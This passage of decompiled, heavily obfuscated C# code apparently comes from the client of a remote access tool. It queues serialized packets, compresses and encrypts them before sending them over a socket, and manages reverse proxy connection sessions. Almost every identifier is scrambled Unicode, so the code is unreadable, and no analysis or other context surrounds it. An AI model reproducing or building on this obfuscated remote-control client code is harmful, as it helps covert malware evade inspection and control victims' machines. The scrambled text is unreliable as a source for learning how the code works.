              this.\u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ = \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.鶕᪐\uE871觘\uF66D\uF885\uF108燱ᕐᨱ䨧鹬Ͻ嫼쬈燓\u17F8Ｊ庻\u1C9F;
              this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 = (byte[]) null;
              this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 = 0;
              this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 = 0;
            }
            if (this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 == 0)
            {
              flag1 = false;
              continue;
            }
            continue;
          default:
            continue;
        }
      }
      if (this.\u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ == \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.鶕᪐\uE871觘\uF66D\uF885\uF108燱ᕐᨱ䨧鹬Ͻ嫼쬈燓\u17F8Ｊ庻\u1C9F)
        this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 = 0;
      this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ = 0;
      this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 = 0;
    }
  }

  public void 㒨蝡肏뚉\uFFFD鈠㹀ꢴ\u29C1漗ྯ岥\u2FF8쌷尯洐싣笟晤끦<T>(T packet) where T : 븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE
  {
    try
    {
      if (!this.Connected || (object) packet == null)
        return;
      lock (this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔)
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          try
          {
            this.Serializer.Serialize((Stream) memoryStream, (object) packet);
          }
          catch (Exception ex)
          {
            this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
            return;
          }
          byte[] array = memoryStream.ToArray();
          this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔.Enqueue(array);
          this.剘澌븓៩頻\uF34C㩝ｉ㔈藿渿ꎷ\uFFFD\u3249ሞ휒䐐腇\u296D墵((븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE) packet, (long) array.Length, array);
          lock (this.䜗鋸亊㳺ࢪᄘ\u2E17\uE45Cꑟ嬜\uE3DA谈鼩\u257Dᐶ㙍䋎礘悿뵵)
          {
            if (this.䘍틋爉䱦훧召\uF8F0㱿磤巍\uFBC1肖凍\u21B0\u0B5E湶泃㧹Α\uEC89)
              return;
            this.䘍틋爉䱦훧召\uF8F0㱿磤巍\uFBC1肖凍\u21B0\u0B5E湶泃㧹Α\uEC89 = true;
          }
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.\uEE25㮷嘪侚롮ن\u0B8C低귅\u2B56陦舝\u2818цろ\uFFFD\uFFFD袕\uE7A0Ꮈ));
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public void 氶ᆾ\uE991ᆸ鴲衎关䑼Ồ\uF79D亜\uF07Eᅓ㭏뺙壅ꂪ\u05CC㒞⁫<T>(T packet) where T : 븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE
  {
    try
    {
      this.㒨蝡肏뚉\uFFFD鈠㹀ꢴ\u29C1漗ྯ岥\u2FF8쌷尯洐싣笟晤끦<T>(packet);
      while (this.䘍틋爉䱦훧召\uF8F0㱿磤巍\uFBC1肖凍\u21B0\u0B5E湶泃㧹Α\uEC89)
        Thread.Sleep(10);
    }
    catch (Exception ex)
    {
    }
  }

  private void \uEE25㮷嘪侚롮ن\u0B8C低귅\u2B56陦舝\u2818цろ\uFFFD\uFFFD袕\uE7A0Ꮈ(object state)
  {
    while (this.Connected)
    {
      byte[] payload;
      lock (this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔)
      {
        if (this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔.Count == 0)
        {
          this.즤ޏ쒭ꔟ놶쩹惰慺찙ۚ\uFFFD졗慾驓蚅\uED30䯌㔅㸿文();
          return;
        }
        payload = this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔.Dequeue();
      }
      try
      {
        this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.Send(this.奓ꡗ襇\u9FE8餱ɴ伕ꅗ銽뫶享癔橵扚茇ᡨ\u24DC힍煮ࠌ(payload));
      }
      catch (Exception ex)
      {
        this.\u20B3ͭ뷅\u2235깽Ӄ\u061D㡜㱲쎬胄孬\u3227\u319B㕴㮢蠕叡蕙煤(ex);
        this.즤ޏ쒭ꔟ놶쩹惰慺찙ۚ\uFFFD졗慾驓蚅\uED30䯌㔅㸿文(true);
        return;
      }
    }
    this.즤ޏ쒭ꔟ놶쩹惰慺찙ۚ\uFFFD졗慾驓蚅\uED30䯌㔅㸿文(true);
  }

  private byte[] 奓ꡗ襇\u9FE8餱ɴ伕ꅗ銽뫶享癔橵扚茇ᡨ\u24DC힍煮ࠌ(byte[] payload)
  {
    try
    {
      payload = \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.戻\uE4C0뜆\u2309绤\u2A90詮㵭匏\u32D1㟆胗턭锐ᐷ\u0D81棷飡밵\uE95D(payload);
      payload = 槦\uFFFD辺櫌\uEA69ɱ\uE127\uE010銃㡔臚\uAACE蒂ἄ鞷퀆\u2A62鲮䛱黖.\uF34A痚\uFFFD\uF033樔䖍뤲秖恑\uFFFD正绫裘\uEC68\uE055\uF412탣뛚銸宅(payload);
      byte[] destinationArray = new byte[payload.Length + this.HEADER_SIZE];
      Array.Copy((Array) BitConverter.GetBytes(payload.Length), (Array) destinationArray, this.HEADER_SIZE);
      Array.Copy((Array) payload, 0, (Array) destinationArray, this.HEADER_SIZE, payload.Length);
      return destinationArray;
    }
    catch (Exception ex)
    {
    }
    return (byte[]) null;
  }

  private void 즤ޏ쒭ꔟ놶쩹惰慺찙ۚ\uFFFD졗慾驓蚅\uED30䯌㔅㸿文(bool clear = false)
  {
    try
    {
      lock (this.䜗鋸亊㳺ࢪᄘ\u2E17\uE45Cꑟ嬜\uE3DA谈鼩\u257Dᐶ㙍䋎礘悿뵵)
        this.䘍틋爉䱦훧召\uF8F0㱿磤巍\uFBC1肖凍\u21B0\u0B5E湶泃㧹Α\uEC89 = false;
      if (!clear)
        return;
      lock (this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔)
        this.\u2014\uF6FBᴡ㪉む佘떕\uE3CC픯徳ᗮ嬀ꕭ\u2479ጧ\u2033稒꺭謂뢔.Clear();
    }
    catch (Exception ex)
    {
    }
  }

  public void 킽믭죵䥭乫ౄ玤寞\u2B02濄앟毑\uFE5F\uAA39槔\uE764헽㸀泼梹()
  {
    try
    {
      if (this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈 != null)
      {
        this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈.Close();
        this.䨹痚賢飳糑嬂䘰ᜋ\uFFFD얬浈흕\uE019\uEFFC\uAAD8䡂\u24CF芸Ⳗ碈 = (Socket) null;
        this.ꩱ\uEF58Ự劉ㆦ팾\u33CC彇썇\uE64F읂쾡ꨘ魬쁦靷Ⴃ雗坸ꮘ = 0;
        this.ꑪꒉ鼀\uFDD7ʹ믨\uEF36뉿ᙴ胯开꺍㘶\uE543嚺㶺\uF13B傊刈쑢 = 0;
        this.ċ閩몉嘹ڷ\uE47E鼠傗\uF758\u26EA檤虑赀鷿䡓ㄚ谮㳌饙\u26D0 = 0;
        this.츗ﵚᠳᑶ\u2452\uA49F吞\u1CFA奃說\u187E\uF439푽ᬲ肉儿ﳰ㑝ૌ\uEEC8 = 0;
        this.탊\u3368䮩\u28F2埡\uA48D\uE2FEᳰ\uE322먾\u1AF7彃莁\uE9B8젗旱Ș隋\uFFFD䋥 = 0;
        this.尵菴\u2F30\uA7DF㵮\uEBC1艣묾ḍ훲쩣艽뇇ꃁ\uF5EEྷ녭㥴綰愨 = (byte[]) null;
        this.\u1BA1偩ﱊ\uFAEE\u0CF8뜒鬢䋷餐ᖱէ則蹟ﱗ瞜ﲼ\uE178э쮩Ħ = \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿.鶕᪐\uE871觘\uF66D\uF885\uF108燱ᕐᨱ䨧鹬Ͻ嫼쬈燓\u17F8Ｊ庻\u1C9F;
        if (this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧 != null)
        {
          lock (this.晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫)
          {
            try
            {
              foreach (\uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98 蘄ꫬ왒葧륦ଢ଼쩅徳蘃瀡草돒ቺ̽ in this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧)
                蘄ꫬ왒葧륦ଢ଼쩅徳蘃瀡草돒ቺ̽.웇㑣喫ⴉ捊뮙檼頯俓\uEB25\uFFFD䫸ɝ岵룉룭\uFE42삩ꈶ\u2E50();
            }
            catch (Exception ex)
            {
            }
          }
        }
        if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 != null)
        {
          쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Dispose();
          쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 = (UnsafeStreamCodec) null;
        }
      }
      this.\uFFFD緜\uF2EBⱘ\uE573\uF402\u28D6붨ퟸ蝪ꛇ䯀\u28D2ᄏ嗌䤦駇뤮ཆ깤(false);
    }
    catch (Exception ex)
    {
    }
  }

  public void 拮串ੱ쨎\u2202ᚺ搿\uFFFD\uF842\uFFFDǝ槕櫭\uFFFD鏧篝誗㒗桬䶌(ReverseProxyConnect command)
  {
    lock (this.晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫)
      this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧.Add(new \uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98(command, this));
  }

  public \uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98 \uE1D6战刺匫㺕ﾲ낤퍆䩭Ꞅ攷䗬晗龕픷乊硃\uA7EC惣校(
    int connectionId)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.ꊺ蒹ᑍ䌞㭀푙榰\uE104蝝\u2653擹显ⶀꢧ千\uFFFD㯊櫭\u224D\u227A ꊺ蒹ᑍ䌞㭀푙榰蝝擹显ⶀꢧ千㯊櫭 = new \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ.ꊺ蒹ᑍ䌞㭀푙榰\uE104蝝\u2653擹显ⶀꢧ千\uFFFD㯊櫭\u224D\u227A();
    // ISSUE: reference to a compiler-generated field
    ꊺ蒹ᑍ䌞㭀푙榰蝝擹显ⶀꢧ千㯊櫭.ⲹ\uFFFD䮴ⅶ\uE066止ꦛᨀɋ쁙呥\u31E9㣤菩䧆㱎觙\u0B53涽\u08CA = connectionId;
    lock (this.晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫)
    {
      // ISSUE: reference to a compiler-generated method
      return this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧.FirstOrDefault<\uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98>(new Func<\uED81蘄ꫬ왒葧륦ଢ଼쩅徳\u0DF6蘃瀡\u2941草돒ቺ̽\u27CC\u27A2\u1C98, bool>(ꊺ蒹ᑍ䌞㭀푙榰蝝擹显ⶀꢧ千㯊櫭.뮸ލ\uE6E9塜\uEF7Cⴐ\uFFFD䄮\u1B77갈ꕠ\uE098쒌撴\u0CF7\u32DE兾勎㗮졵));
    }
  }

  public void ɮ\uF185抬ĭ掮塒\uEC23ᄯ뵜챴け\uF33D斣ߴ\uEC03蔧\uE325傜邾\u0CCE(int connectionId)
  {
    try
    {
      lock (this.晑墆迦\u282B\uF4F2\uFFFD옔祦\u2E5F໒㬯ὤﱒ\uFFFD\u0DF6\u0885\u1FDF师要駫)
      {
        for (int index = 0; index < this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧.Count; ++index)
        {
          if (this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧[index].ConnectionId == connectionId)
          {
            this.\uEF58꧷졫\uF3BD\uFFFDꖉᴮ鞠蚿삥贸\uE961ുၢ깞᪳\u2FA7笢๓靧.RemoveAt(index);
            break;
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public delegate void 翤ꘉ骸晴掌훌\uA6FDήᇴ\u2E22釓\uE00E蚟挳䗷\u2FD6螬膥斫峽(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ s,
    Exception ex);

  public delegate void ꢄ絹ￏ恵襇럁\u2EC7笏㻣\u28C3ᱶ\uE8C5㫗咿㶠쇸퓫ᱲ㤣뵏(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ s,
    bool connected);

  public delegate void \u108C쌬먿圽ᙜ黦ꕛ\uA7ED㖵蔡뫝ꉼᅮ暾\u0A0E睯䟯\uF376\uE72Fゕ(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ s,
    븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE packet);

  public delegate void 뱦\u2361\uE5F2\uE9DF捄揍賛ሴ븘㲉隽\uE6E5ﰴ驊ᰓ첪㳑ξٖ\uE974(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ s,
    븞朱\uEBB8統ᡣꡜŶ\uF43D\uF85B蒣냋㡁臀핝닍뤱畱쪩㐨\u20DE packet,
    long length,
    byte[] rawData);

  public enum 島㹻\u2A41Ṱ䮤\u0F48瓐倰\u20A7얚Ṥ役݃哱㽺㷥ಿ㵘睓쿿
  {
    鶕᪐\uE871觘\uF66D\uF885\uF108燱ᕐᨱ䨧鹬Ͻ嫼쬈燓\u17F8Ｊ庻\u1C9F,
    \uE8AFࣦ脇挛挕潕漶涊턬Ꙛ䴎鶌\uF3FA\uE7E0눻鞚\u2681먚岛ओ,
  }
}
